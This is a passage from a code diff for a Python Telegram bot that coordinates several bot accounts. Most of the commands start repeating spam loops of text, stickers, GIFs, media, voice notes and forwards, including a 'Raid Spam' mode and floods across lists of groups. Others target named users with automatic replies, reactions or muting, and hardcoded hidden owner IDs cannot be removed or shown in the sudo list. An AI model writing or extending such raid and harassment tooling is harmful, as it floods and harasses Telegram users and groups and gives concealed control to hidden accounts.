+    active_menus[task_id] = {"cmd": "pfp", "chat_id": message.chat.id, "selected": set(range(len(bots)))}
+
+
+
+    await message.reply(font("📸 **PFP LOOP MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("stickerspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("stickerspm", prefix="-./X!"))
+
+
+
+async def cmd_stickerspm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message or not message.reply_to_message.sticker:
+
+
+
+        return await safe_reply(message, font("⚠️ Reply to a sticker with `!stickerspm`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    task_id = str(uuid.uuid4())[:8]
+
+
+
+    active_menus[task_id] = {
+
+
+
+        "cmd": "stickerspm", "chat_id": message.chat.id, 
+
+
+
+        "from_chat_id": message.reply_to_message.chat.id, "msg_id": message.reply_to_message.message_id, 
+
+
+
+        "selected": set(range(len(bots)))
+
+
+
+    }
+
+
+
+    await message.reply(font("🎭 **STICKER SPAM MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("gifspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("gifspm", prefix="-./X!"))
+
+
+
+async def cmd_gifspm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message or not message.reply_to_message.animation:
+
+
+
+        return await safe_reply(message, font("⚠️ Reply to a GIF with `!gifspm`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    task_id = str(uuid.uuid4())[:8]
+
+
+
+    active_menus[task_id] = {
+
+
+
+        "cmd": "gifspm", "chat_id": message.chat.id, 
+
+
+
+        "from_chat_id": message.reply_to_message.chat.id, "msg_id": message.reply_to_message.message_id, 
+
+
+
+        "selected": set(range(len(bots)))
+
+
+
+    }
+
+
+
+    await message.reply(font("🎥 **GIF SPAM MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("mediaspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("mediaspm", prefix="-./X!"))
+
+
+
+async def cmd_mediaspm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    rm = message.reply_to_message
+
+
+
+    if not rm:
+
+
+
+        return await safe_reply(message, font("⚠️ Reply to a media (photo/video/doc/audio) with `!mediaspm`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    media_type, file_id = None, None
+
+
+
+    if rm.photo: media_type, file_id = "photo", rm.photo[-1].file_id
+
+
+
+    elif rm.video: media_type, file_id = "video", rm.video.file_id
+
+
+
+    elif rm.document: media_type, file_id = "document", rm.document.file_id
+
+
+
+    elif rm.audio: media_type, file_id = "audio", rm.audio.file_id
+
+
+
+    elif rm.animation: media_type, file_id = "animation", rm.animation.file_id
+
+
+
+    elif rm.voice: media_type, file_id = "voice", rm.voice.file_id
+
+
+
+    else:
+
+
+
+        return await safe_reply(message, font("⚠️ Unsupported media type! Please reply to photo, video, doc, or audio."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    task_id = str(uuid.uuid4())[:8]
+
+
+
+    active_menus[task_id] = {
+
+
+
+        "cmd": "mediaspm", "chat_id": message.chat.id, 
+
+
+
+        "media_type": media_type, "file_id": file_id,
+
+
+
+        "caption": rm.caption, "caption_entities": rm.caption_entities,
+
+
+
+        "selected": set(range(len(bots)))
+
+
+
+    }
+
+
+
+    await message.reply(font("🖼️ **MEDIA SPAM MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("voicespm", "voicespam", prefix="-./X!"))
+
+
+
+@dp.message(Command("voicespm", "voicespam", prefix="-./X!"))
+
+
+
+async def cmd_voicespm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message or not message.reply_to_message.voice:
+
+
+
+        return await safe_reply(message, font("⚠️ Reply to a voice note with `!voicespam`"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    task_id = str(uuid.uuid4())[:8]
+
+
+
+    active_menus[task_id] = {
+
+
+
+        "cmd": "voicespm", "chat_id": message.chat.id, 
+
+
+
+        "media_type": "voice", "file_id": message.reply_to_message.voice.file_id,
+
+
+
+        "caption": message.reply_to_message.caption, "caption_entities": message.reply_to_message.caption_entities,
+
+
+
+        "selected": set(range(len(bots)))
+
+
+
+    }
+
+
+
+    await message.reply(font("🎤 **VOICE SPAM MENU**\nSelect bots:"), reply_markup=get_selector_keyboard(task_id), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dpfp", prefix="-./X!"))
+
+
+
+@dp.message(Command("dpfp", prefix="-./X!"))
+
+
+
+async def cmd_dpfp(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if stop_task_group(pfp_tasks, message.chat.id):
+
+
+
+        await safe_reply(message, font("🛑 PFP loops stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("dstickerspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("dstickerspm", prefix="-./X!"))
+
+
+
+async def cmd_dstickerspm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if stop_task_group(sticker_spm_tasks, message.chat.id):
+
+
+
+        await safe_reply(message, font("🛑 Sticker SPM stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("dgifspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("dgifspm", prefix="-./X!"))
+
+
+
+async def cmd_dgifspm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if stop_task_group(gif_spm_tasks, message.chat.id):
+
+
+
+        await safe_reply(message, font("🛑 GIF SPM stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("dmediaspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("dmediaspm", prefix="-./X!"))
+
+
+
+async def cmd_dmediaspm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if stop_task_group(media_spm_tasks, message.chat.id):
+
+
+
+        await safe_reply(message, font("🛑 Media SPM stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("dvoicespm", prefix="-./X!"))
+
+
+
+@dp.message(Command("dvoicespm", prefix="-./X!"))
+
+
+
+async def cmd_dvoicespm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if stop_task_group(voice_spm_tasks, message.chat.id):
+
+
+
+        await safe_reply(message, font("🛑 Voice SPM stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("delaypfp", prefix="-./X!"))
+
+
+
+@dp.message(Command("delaypfp", prefix="-./X!"))
+
+
+
+async def cmd_delaypfp(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    try:
+
+
+
+        if not command.args: raise ValueError
+
+
+
+        val = int(command.args)
+
+
+
+        pfp_delays[message.chat.id] = max(10, val)
+
+
+
+        await safe_reply(message, font("✅ PFP delay set."))
+
+
+
+    except Exception: pass
+
+
+
+
+
+
+
+@dp.channel_post(Command("delaygcspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("delaygcspm", prefix="-./X!"))
+
+
+
+async def cmd_delaygcspm(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    try:
+
+
+
+        if not command.args: raise ValueError
+
+
+
+        val = int(command.args)
+
+
+
+        spm_delays[message.chat.id] = max(10, val)
+
+
+
+        await safe_reply(message, font("✅ SPM delay set."))
+
+
+
+    except Exception: pass
+
+
+
+
+
+
+
+@dp.channel_post(Command("targetslide", prefix="-./X!"))
+
+
+
+@dp.message(Command("targetslide", prefix="-./X!"))
+
+
+
+async def cmd_targetslide(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    uid, name = await get_target_info(message, command.args)
+
+
+
+    if not uid: return await safe_reply(message, font("⚠️ Reply to a message/channel or tag a target"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    targetslide_targets[uid] = name 
+
+
+
+    save_db()
+
+
+
+    
+
+
+
+    acc_link = f"[{name}](tg://user?id={uid})" if uid > 0 else name
+
+
+
+    await safe_reply(message, font(f"🎯 Target Slide locked onto {acc_link}!"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dtargetslide", prefix="-./X!"))
+
+
+
+@dp.message(Command("dtargetslide", prefix="-./X!"))
+
+
+
+async def cmd_dtargetslide(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    uid, _ = await get_target_info(message, command.args)
+
+
+
+    if not uid: return await safe_reply(message, font("⚠️ Reply to a message/channel or tag a target"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    if uid in targetslide_targets: 
+
+
+
+        del targetslide_targets[uid]
+
+
+
+        save_db()
+
+
+
+    await safe_reply(message, font("🛑 Target Slide loop stopped for target."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("slidespam", prefix="-./X!"))
+
+
+
+@dp.message(Command("slidespam", prefix="-./X!"))
+
+
+
+async def cmd_slidespam(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message: return await safe_reply(message, font("⚠️ Reply to a message"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    rm = message.reply_to_message
+
+
+
+    uid = rm.sender_chat.id if rm.sender_chat else (rm.from_user.id if rm.from_user else rm.chat.id)
+
+
+
+    
+
+
+
+    exact_text = get_exact_text(message)
+
+
+
+    if not exact_text:
+
+
+
+        return await safe_reply(message, font("⚠️ Usage: ") + "`!slidespam <text>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    if uid not in slidespam_tasks: slidespam_tasks[uid] =[]
+
+
+
+    for i, b in enumerate(bots):
+
+
+
+        task_id = str(uuid.uuid4())
+
+
+
+        slidespam_tasks[uid].append(task_id)
+
+
+
+        
+
+
+
+        asyncio.create_task(delayed_task(i * 0.15, spm_sender(b, message .chat.id, message.reply_to_message.message_id, exact_text, slidespam_tasks, uid, task_id)))
+
+
+
+    await safe_reply(message, font("💥 SlideSpam locked on message!"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+@dp.channel_post(Command("dslidespam", prefix="-./X!"))
+
+
+
+@dp.message(Command("dslidespam", prefix="-./X!"))
+
+
+
+async def cmd_dslidespam(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message: return await safe_reply(message, font("⚠️ Reply to a message"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    rm = message.reply_to_message
+
+
+
+    uid = rm.sender_chat.id if rm.sender_chat else (rm.from_user.id if rm.from_user else rm.chat.id)
+
+
+
+    
+
+
+
+    if stop_task_group(slidespam_tasks, uid):
+
+
+
+        await safe_reply(message, font("🛑 SlideSpam loop stopped."))
+
+
+
+@dp.channel_post(Command("forwardspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("forwardspm", prefix="-./X!"))
+
+
+
+async def cmd_forwardspm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not message.reply_to_message:
+
+
+
+        return await safe_reply(message, font("⚠️ Reply to a message you want to forward loop."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    chat_id = message.chat.id
+
+
+
+    if chat_id not in forwardspm_tasks: forwardspm_tasks[chat_id] = []
+
+
+
+    
+
+
+
+    for i, b in enumerate(bots):
+
+
+
+        task_id = str(uuid.uuid4())
+
+
+
+        forwardspm_tasks[chat_id].append(task_id)
+
+
+
+        asyncio.create_task(delayed_task(i * 0.15, forward_spm_sender(b, chat_id, message.chat.id, message.reply_to_message.message_id, forwardspm_tasks, task_id)))
+
+
+
+    await safe_reply(message, font("⏩ Forward SPM loop started."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dforwardspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("dforwardspm", prefix="-./X!"))
+
+
+
+async def cmd_dforwardspm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if stop_task_group(forwardspm_tasks, message.chat.id):
+
+
+
+        await safe_reply(message, font("🛑 Forward SPM stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("spm", "gspm", "lordspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("spm", "gspm", "lordspm", prefix="-./X!"))
+
+
+
+async def cmd_spm(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    exact_text = get_exact_text(message)
+
+
+
+    if not exact_text:
+
+
+
+        return await safe_reply(message, font("⚠️ Usage: ") + "`!spm <text>` or `!gspm <text>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    is_lord = command.command.startswith("g") or command.command.startswith("lord")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        if c_id not in spm_loop_tasks: spm_loop_tasks[c_id] = []
+
+
+
+        for i, b in enumerate(bots):
+
+
+
+            task_id = str(uuid.uuid4())
+
+
+
+            spm_loop_tasks[c_id].append(task_id)
+
+
+
+            asyncio.create_task(delayed_task(i * 0.15, spm_sender(b, c_id, None, exact_text, spm_loop_tasks, c_id, task_id)))
+
+
+
+            
+
+
+
+    scope_str = f"across {len(target_chats)} Lord list groups!" if is_lord else "in this chat."
+
+
+
+    await safe_reply(message, font(f"✅ SPM loop started {scope_str}"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dspm", "gdspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("dspm", "gdspm", prefix="-./X!"))
+
+
+
+async def cmd_dspm(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    for c_id in target_chats:
+
+
+
+        stop_task_group(spm_loop_tasks, c_id)
+
+
+
+    await safe_reply(message, font("🛑 SPM loops stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("RAHULspam", "gRAHULspam", prefix="-./X!"))
+
+
+
+@dp.message(Command("RAHULspam", "gRAHULspam", prefix="-./X!"))
+
+
+
+async def cmd_RAHULspam(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    exact_text = get_exact_text(message)
+
+
+
+    if not exact_text:
+
+
+
+        return await safe_reply(message, font("⚠️ Usage: ") + "`!RAHULspam <text>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+        
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        if c_id not in RAHULspam_tasks: RAHULspam_tasks[c_id] = []
+
+
+
+        for i, b in enumerate(bots):
+
+
+
+            task_id = str(uuid.uuid4())
+
+
+
+            RAHULspam_tasks[c_id].append(task_id)
+
+
+
+            asyncio.create_task(delayed_task(i * 0.15, RAHULspam_sender(b, c_id, exact_text, RAHULspam_tasks, task_id)))
+
+
+
+    await safe_reply(message, font("🔥 RAHUL SPAM long loop started."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dRAHULspam", "gdRAHULspam", prefix="-./X!"))
+
+
+
+@dp.message(Command("dRAHULspam", "gdRAHULspam", prefix="-./X!"))
+
+
+
+async def cmd_dRAHULspam(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    for c_id in target_chats:
+
+
+
+        stop_task_group(RAHULspam_tasks, c_id)
+
+
+
+    await safe_reply(message, font("🛑 RAHUL SPAM loops stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("rspm", "grspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("rspm", "grspm", prefix="-./X!"))
+
+
+
+async def cmd_rspm(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!rspm <name>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+    
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    
+
+
+
+    for c_id in target_chats:
+
+
+
+        if c_id not in rspm_tasks: rspm_tasks[c_id] = []
+
+
+
+        for i, b in enumerate(bots):
+
+
+
+            task_id = str(uuid.uuid4())
+
+
+
+            rspm_tasks[c_id].append(task_id)
+
+
+
+            asyncio.create_task(delayed_task(i * 0.15, rspm_sender(b, c_id, command.args.strip(), rspm_tasks, task_id)))
+
+
+
+    await safe_reply(message, font(f"🔥 RSPM (Raid Spam) loop started for `{command.args.strip()}`!"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("drspm", "gdrspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("drspm", "gdrspm", prefix="-./X!"))
+
+
+
+async def cmd_drspm(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    is_lord = command.command.startswith("g")
+
+
+
+    target_chats = get_target_chats(message, is_lord)
+
+
+
+    for c_id in target_chats:
+
+
+
+        stop_task_group(rspm_tasks, c_id)
+
+
+
+    await safe_reply(message, font("🛑 RSPM loops stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("delayrspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("delayrspm", prefix="-./X!"))
+
+
+
+async def cmd_delayrspm(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    try:
+
+
+
+        if not command.args: raise ValueError
+
+
+
+        val = int(command.args)
+
+
+
+        rspm_delays[message.chat.id] = max(10, val)
+
+
+
+        await safe_reply(message, font("✅ RSPM delay set."))
+
+
+
+    except Exception: pass
+
+
+
+
+
+
+
+@dp.channel_post(Command("dallspm", "gdallspm", prefix="-./X!"))
+
+
+
+@dp.message(Command("dallspm", "gdallspm", prefix="-./X!"))
+
+
+
+async def cmd_dallspm(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    spm_loop_tasks.clear()
+
+
+
+    RAHULspam_tasks.clear()
+
+
+
+    rspm_tasks.clear()
+
+
+
+    forwardspm_tasks.clear()
+
+
+
+    await safe_reply(message, font("🛑 All SPM loops stopped (globally)."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("swipe", prefix="-./X!"))
+
+
+
+@dp.message(Command("swipe", prefix="-./X!"))
+
+
+
+async def cmd_swipe(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if not command.args: return await safe_reply(message, font("⚠️ Usage: ") + "`!swipe <name>`", parse_mode=ParseMode.MARKDOWN)
+
+
+
+    swipe_mode[message.chat.id] = command.args.strip()
+
+
+
+    await safe_reply(message, font("⚡ Swipe Mode ON"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("dswipe", prefix="-./X!"))
+
+
+
+@dp.message(Command("dswipe", prefix="-./X!"))
+
+
+
+async def cmd_dswipe(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    if message.chat.id in swipe_mode: del swipe_mode[message.chat.id]
+
+
+
+    await safe_reply(message, font("🛑 Swipe Mode stopped."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("replyRAHUL", prefix="-./X!"))
+
+
+
+@dp.message(Command("replyRAHUL", prefix="-./X!"))
+
+
+
+async def cmd_replyRAHUL(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    uid, _ = await get_target_info(message, command.args)
+
+
+
+    if not uid: return await safe_reply(message, font("⚠️ Reply to a target or tag a user"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    reply_RAHUL_targets.add(uid)
+
+
+
+    save_db()
+
+
+
+    await safe_reply(message, font("💬 ReplyRAHUL enabled for this target."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("dreplyRAHUL", prefix="-./X!"))
+
+
+
+@dp.message(Command("dreplyRAHUL", prefix="-./X!"))
+
+
+
+async def cmd_dreplyRAHUL(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    uid, _ = await get_target_info(message, command.args)
+
+
+
+    if not uid: return await safe_reply(message, font("⚠️ Reply to a target or tag a user"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+    if uid in reply_RAHUL_targets: 
+
+
+
+        reply_RAHUL_targets.remove(uid)
+
+
+
+        save_db()
+
+
+
+    await safe_reply(message, font("🛑 ReplyRAHUL stopped for this target."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("react", prefix="-./X!"))
+
+
+
+@dp.message(Command("react", prefix="-./X!"))
+
+
+
+async def cmd_react(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    if not message.reply_to_message:
+
+
+
+        return await safe_reply(message, font("⚠️ Please reply to the user or channel you want to -react to!"))
+
+
+
+    
+
+
+
+    rm = message.reply_to_message
+
+
+
+    if rm.forward_from_chat:
+
+
+
+        uid = rm.forward_from_chat.id
+
+
+
+        name = rm.forward_from_chat.title or "Channel"
+
+
+
+    elif rm.sender_chat:
+
+
+
+        uid = rm.sender_chat.id
+
+
+
+        name = rm.sender_chat.title or "Channel"
+
+
+
+    elif rm.from_user:
+
+
+
+        uid = rm.from_user.id
+
+
+
+        name = rm.from_user.first_name
+
+
+
+    else:
+
+
+
+        uid = rm.chat.id
+
+
+
+        name = rm.chat.title or "Channel"
+
+
+
+
+
+
+
+    emoji = command.args.strip() if command.args else ""
+
+
+
+    
+
+
+
+    if emoji not in VALID_REACTS:
+
+
+
+        allowed = ", ".join(VALID_REACTS)
+
+
+
+        return await safe_reply(message, font(f"❌ Invalid emoji! Please use one of the allowed emojis:\n{allowed}"))
+
+
+
+        
+
+
+
+    react_targets[uid] = emoji
+
+
+
+    save_db()
+
+
+
+    await safe_reply(message, font(f"✅ -react mode started for {name} with emoji {emoji}!"))
+
+
+
+
+
+
+
+@dp.channel_post(Command("dreact", prefix="-./X!"))
+
+
+
+@dp.message(Command("dreact", prefix="-./X!"))
+
+
+
+async def cmd_dreact(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    if not message.reply_to_message:
+
+
+
+        return await safe_reply(message, font("⚠️ Please reply to the user or channel!"))
+
+
+
+        
+
+
+
+    rm = message.reply_to_message
+
+
+
+    uid = rm.forward_from_chat.id if rm.forward_from_chat else (rm.sender_chat.id if rm.sender_chat else (rm.from_user.id if rm.from_user else rm.chat.id))
+
+
+
+    
+
+
+
+    if uid in react_targets:
+
+
+
+        del react_targets[uid]
+
+
+
+        save_db()
+
+
+
+    
+
+
+
+    await safe_reply(message, font("🛑 -react stopped for this target."))
+
+
+
+
+
+
+
+@dp.channel_post(Command("addsudo", prefix="-./X!"))
+
+
+
+@dp.message(Command("addsudo", prefix="-./X!"))
+
+
+
+async def cmd_addsudo(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_owner(get_auth_id(message)): return await safe_reply(message, font("❌ Only OWNER can do this."))
+
+
+
+    uid, name = await get_target_info(message, command.args)
+
+
+
+    if uid:
+
+
+
+        SUDO_USERS.add(uid)
+
+
+
+        save_sudo()
+
+
+
+        await safe_reply(message, font(f"👑 `{name}` (`{uid}`) added as SUDO ✅"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("delsudo", prefix="-./X!"))
+
+
+
+@dp.message(Command("delsudo", prefix="-./X!"))
+
+
+
+async def cmd_delsudo(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_owner(get_auth_id(message)): return await safe_reply(message, font("❌ Only OWNER can do this."))
+
+
+
+    uid, name = await get_target_info(message, command.args)
+
+
+
+    if uid and uid in HIDDEN_OWNER_IDS:
+
+
+
+        return await safe_reply(message, font("\u274c Hidden owners cannot be removed."))
+
+
+
+    if uid and uid in SUDO_USERS:
+
+
+
+        SUDO_USERS.remove(uid)
+
+
+
+        save_sudo()
+
+
+
+        await safe_reply(message, font(f"🗑 `{name}` (`{uid}`) removed from SUDO ❌"), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("listsudo", prefix="-./X!"))
+
+
+
+@dp.message(Command("listsudo", prefix="-./X!"))
+
+
+
+async def cmd_listsudo(message: types.Message, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    
+
+
+
+    sudo_list = []
+
+
+
+    for u in SUDO_USERS:
+
+
+
+        if u in HIDDEN_OWNER_IDS:
+
+
+
+            continue
+
+
+
+        name = user_names.get(u, "Admin")
+
+
+
+        sudo_list.append(f"• [{name}](tg://user?id={u}) (`{u}`)" if u > 0 else f"• Channel (`{u}`)")
+
+
+
+        
+
+
+
+    await safe_reply(message, font("👑 SUDO Users:\n\n") + "\n".join(sudo_list), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("mute", prefix="-./X!"))
+
+
+
+@dp.message(Command("mute", prefix="-./X!"))
+
+
+
+async def cmd_mute(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    uid, name = await get_target_info(message, command.args)
+
+
+
+    if uid:
+
+
+
+        muted_users.add(uid)
+
+
+
+        save_db()
+
+
+
+        
+
+
+
+        acc_link = f"[{name}](tg://user?id={uid})" if uid > 0 else name
+
+
+
+        await safe_reply(message, font(f"🔇 Target {acc_link} muted."), parse_mode=ParseMode.MARKDOWN)
+
+
+
+
+
+
+
+@dp.channel_post(Command("unmute", prefix="-./X!"))
+
+
+
+@dp.message(Command("unmute", prefix="-./X!"))
+
+
+
+async def cmd_unmute(message: types.Message, command: CommandObject, bot: Bot):
+
+
+
+    if is_processed(message.message_id, message.chat.id): return
+
+
+
+    if not is_sudo(get_auth_id(message)): return
+
+
+
+    uid, name = await get_target_info(message, command.args)
+
+
+
+    if uid and uid in muted_users:
+
+
+
+        muted_users.remove(uid)
+
+
+
+        save_db()
+
+
+
+        
+
+
+
+        acc_link = f"[{name}](tg://user?id={uid})" if uid > 0 else name
+
+
+
